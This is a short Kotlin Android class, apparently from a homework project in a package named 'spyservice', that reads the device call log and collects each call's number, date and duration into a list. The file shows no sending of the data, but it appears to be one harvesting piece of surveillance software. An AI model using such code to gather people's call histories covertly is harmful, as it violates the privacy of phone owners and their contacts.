package com.homework.myapplication.spyservice

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import java.util.*

class GetCalls : (Context) -> List<String> {
    @SuppressLint("Recycle")
    override fun invoke(context: Context): List<String> {
        val calls: MutableList<String> = ArrayList()
        val cursor: Cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null, null, null, null
        ) ?: return emptyList()
        while (cursor.moveToNext()) {
            try {
                val number: String =
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val date: String =
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                val duration: String =
                    cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                calls.add("$number : $date : $duration")
            } catch (e: Exception) {

            }
        }
        cursor.close()
        return calls
    }
}
